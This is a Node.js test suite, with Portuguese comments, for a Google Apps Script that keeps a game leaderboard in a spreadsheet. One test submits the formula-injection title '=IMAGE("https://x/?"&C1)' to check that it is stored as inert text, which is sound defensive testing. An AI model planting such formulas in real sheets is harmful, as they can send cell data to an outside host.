// Testes do scripts/ranking_apps_script.gs fora do Google: `node scripts/ranking_apps_script.test.js`.
// Roda o .gs num contexto com uma planilha em memória e os serviços do Apps Script simulados.
'use strict';
const fs = require('fs');
const vm = require('vm');
const crypto = require('crypto');
const assert = require('assert');

function newContext() {
  const sheets = {};
  const props = {};
  const cache = {};
  // Como o Google Planilhas: sem o formato de texto ('@'), "007" vira 7, "true" vira booleano e "=..." vira
  // fórmula; o apóstrofo no começo força texto (e some na leitura).
  const sheet = (name) => {
    const rows = [];
    let text = false;
    const cell = (v) => {
      if (typeof v !== 'string') return v;
      if (v.startsWith("'")) return v.slice(1);
      if (v.startsWith('=')) return '#FÓRMULA';
      if (text) return v;
      if (/^[+-]?\d+(\.\d+)?$/.test(v)) return Number(v);
      if (v.toLowerCase() === 'true') return true;
      return v;
    };
    return {
      name,
      rows,
      getLastRow: () => rows.length,
      appendRow: (row) => rows.push(row.map(cell)),
      // Como no Google: uma aba vazia devolve uma linha com uma célula vazia.
      getDataRange: () => ({ getValues: () => (rows.length ? rows.map((r) => r.slice()) : [['']]) }),
      getRange: (row, col, numRows, numCols) => ({
        setNumberFormat: (format) => { if (format === '@') text = true; },
        setValues: (values) => {
          for (let i = 0; i < numRows; i++) {
            for (let j = 0; j < numCols; j++) rows[row - 1 + i][col - 1 + j] = cell(values[i][j]);
          }
        },
      }),
    };
  };
  const book = {
    getId: () => 'planilha',
    getSheetByName: (name) => sheets[name] || null,
    insertSheet: (name) => (sheets[name] = sheet(name)),
  };
  const context = {
    sheets,
    console,
    SpreadsheetApp: { create: () => book, openById: () => book },
    PropertiesService: {
      getScriptProperties: () => ({ getProperty: (k) => props[k] || null, setProperty: (k, v) => (props[k] = v) }),
    },
    LockService: { getScriptLock: () => ({ waitLock: () => {}, releaseLock: () => {} }) },
    CacheService: {
      getScriptCache: () => ({ get: (k) => (k in cache ? cache[k] : null), put: (k, v) => (cache[k] = String(v)) }),
    },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: (text) => ({ text, setMimeType() { return this; } }),
    },
    Utilities: {
      DigestAlgorithm: { SHA_256: 'sha256' },
      computeDigest: (_alg, value) => Array.from(crypto.createHash('sha256').update(value).digest()).map((b) => (b > 127 ? b - 256 : b)),
    },
  };
  vm.createContext(context);
  vm.runInContext(fs.readFileSync(__dirname + '/ranking_apps_script.gs', 'utf8'), context);
  context.call = (body) => JSON.parse(context.doPost({ postData: { contents: JSON.stringify(body) } }).text);
  return context;
}

const play = (key, extra) => Object.assign({
  acao: 'enviar', chave: key, mapa: 'm1', titulo: 'Música', artista: 'Banda', dificuldade: 'HARD',
  pontos: 100, precisao: 0.9, combo: 50, perfeitos: 40, semErrar: 30000,
}, extra);

const tests = {
  reservaENomeEmUso() {
    const c = newContext();
    assert.deepStrictEqual(c.call({ acao: 'reservar', nome: 'Rodrigo', chave: 'A' }), { ok: true, nome: 'Rodrigo' });
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'rodrigo', chave: 'B' }).motivo, 'nome_em_uso');
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'ab', chave: 'B' }).motivo, 'nome_invalido');
    assert.strictEqual(c.call({ acao: 'reservar', nome: ' Ana ', chave: 'B' }).nome, 'Ana');
  },
  twoRegistrationsOfTheSameNameOnlyOneWins() {
    const c = newContext();
    const first = c.call({ acao: 'reservar', nome: 'Ana', chave: 'A' });
    const second = c.call({ acao: 'reservar', nome: 'ANA', chave: 'B' });
    assert.strictEqual([first.ok, second.ok].filter(Boolean).length, 1);
  },
  renomearLiberaOAntigoEMantemPontuacoes() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Rodrigo', chave: 'A' });
    c.call(play('A'));
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Digo', chave: 'A' }).ok, true);
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Rodrigo', chave: 'B' }).ok, true);
    const board = c.call({ acao: 'placar', chave: 'B', mapa: 'm1', dificuldade: 'HARD', ordem: 'pontos', sentido: 'desc', busca: '' });
    assert.deepStrictEqual(board.linhas.map((l) => [l.nome, l.valor]), [['Digo', 100]]);
  },
  aWrongKeyCannotRenameOrSubmit() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Rodrigo', chave: 'A' });
    assert.strictEqual(c.call(play('X')).motivo, 'sem_nome');
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Rodrigo', chave: 'X' }).motivo, 'nome_em_uso');
  },
  guardaOMelhorDeCadaNumero() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Rodrigo', chave: 'A' });
    c.call(play('A', { pontos: 100, combo: 50 }));
    const second = c.call(play('A', { pontos: 90, combo: 70 }));
    assert.deepStrictEqual([second.posicao, second.total], [1, 1]);
    const byPoints = c.call({ acao: 'placar', chave: 'A', mapa: 'm1', dificuldade: 'HARD', ordem: 'pontos', sentido: 'desc', busca: '' });
    const byCombo = c.call({ acao: 'placar', chave: 'A', mapa: 'm1', dificuldade: 'HARD', ordem: 'combo', sentido: 'desc', busca: '' });
    assert.strictEqual(byPoints.linhas[0].valor, 100);
    assert.strictEqual(byCombo.linhas[0].valor, 70);
  },
  placarOrdenaBuscaEMarcaVoce() {
    const c = newContext();
    [['Ana', 'A', 300], ['Bruno', 'B', 200], ['Carla', 'C', 100]].forEach(([n, k, p]) => {
      c.call({ acao: 'reservar', nome: n, chave: k });
      c.call(play(k, { pontos: p }));
    });
    const q = (extra) => c.call(Object.assign({ acao: 'placar', chave: 'B', mapa: 'm1', dificuldade: 'HARD', ordem: 'pontos', sentido: 'desc', busca: '' }, extra));
    const desc = q({});
    assert.deepStrictEqual(desc.linhas.map((l) => l.nome), ['Ana', 'Bruno', 'Carla']);
    assert.deepStrictEqual(desc.linhas.map((l) => l.posicao), [1, 2, 3]);
    assert.strictEqual(desc.linhas[1].voce, true);
    assert.deepStrictEqual(q({ sentido: 'asc' }).linhas.map((l) => l.nome), ['Carla', 'Bruno', 'Ana']);
    const found = q({ busca: 'car' });
    assert.deepStrictEqual(found.linhas.map((l) => [l.nome, l.posicao]), [['Carla', 3]]);
    assert.deepStrictEqual(desc.dificuldades, ['HARD']);
  },
  boardBySemErrarSkipsPlayersWithoutIt() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: 'A' });
    c.call({ acao: 'reservar', nome: 'Bruno', chave: 'B' });
    c.call(play('A', { semErrar: null }));
    c.call(play('B', { semErrar: 20000 }));
    const board = c.call({ acao: 'placar', chave: 'A', mapa: 'm1', dificuldade: 'HARD', ordem: 'semErrar', sentido: 'desc', busca: '' });
    assert.deepStrictEqual(board.linhas.map((l) => l.nome), ['Bruno']);
  },
  musicasComJogadoresESuaPosicao() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: 'A' });
    c.call({ acao: 'reservar', nome: 'Bruno', chave: 'B' });
    c.call(play('A', { pontos: 300 }));
    c.call(play('B', { pontos: 200 }));
    c.call(play('B', { mapa: 'm2', titulo: 'Outra', dificuldade: 'EASY' }));
    const songs = c.call({ acao: 'musicas', chave: 'B', busca: '' }).musicas;
    const m1 = songs.find((s) => s.mapa === 'm1');
    assert.deepStrictEqual([m1.titulo, m1.jogadores, m1.suaPosicao], ['Música', 2, 2]);
    assert.strictEqual(c.call({ acao: 'musicas', chave: 'B', busca: 'outr' }).musicas.length, 1);
  },
  semNadaAindaTudoVazio() {
    const c = newContext();
    assert.deepStrictEqual(c.call({ acao: 'musicas', chave: 'A', busca: '' }).musicas, []);
    const board = c.call({ acao: 'placar', chave: 'A', mapa: 'm1', dificuldade: 'HARD', ordem: 'pontos', sentido: 'desc', busca: '' });
    assert.deepStrictEqual([board.linhas, board.dificuldades], [[], []]);
  },
  nomesQueAPlanilhaConverteContinuamUnicos() {
    const c = newContext();
    assert.strictEqual(c.call({ acao: 'reservar', nome: '007', chave: 'A' }).ok, true);
    assert.strictEqual(c.call({ acao: 'reservar', nome: '007', chave: 'B' }).motivo, 'nome_em_uso');
    c.call({ acao: 'reservar', nome: 'true', chave: 'C' });
    c.call(play('A'));
    c.call(play('C'));
    const board = c.call({ acao: 'placar', chave: 'A', mapa: 'm1', dificuldade: 'HARD', ordem: 'pontos', sentido: 'desc', busca: '00' });
    assert.deepStrictEqual(board.linhas.map((l) => l.nome), ['007']);
  },
  tituloComIgualNaoViraFormula() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: 'A' });
    c.call(play('A', { titulo: '=IMAGE("https://x/?"&C1)', artista: '+44' }));
    const song = c.call({ acao: 'musicas', chave: 'A', busca: '' }).musicas[0];
    assert.deepStrictEqual([song.titulo, song.artista], ['=IMAGE("https://x/?"&C1)', '+44']);
  },
  limitePorHora() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: 'A' });
    for (let i = 0; i < 60; i++) assert.strictEqual(c.call(play('A')).ok, true);
    assert.strictEqual(c.call(play('A')).motivo, 'limite');
  },
  chaveGuardadaSoComoHash() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: 'segredo-123' });
    assert.ok(!JSON.stringify(c.sheets).includes('segredo-123'));
  },
  pedidoEstranhoNaoQuebra() {
    const c = newContext();
    assert.strictEqual(JSON.parse(c.doPost({ postData: { contents: 'não é json' } }).text).ok, false);
    assert.strictEqual(c.call({ acao: 'outra' }).ok, false);
  },
};

let failed = 0;
for (const [name, test] of Object.entries(tests)) {
  try {
    test();
    console.log('ok   ' + name);
  } catch (e) {
    failed++;
    console.log('FAIL ' + name + ': ' + e.message);
  }
}
if (failed) process.exit(1);
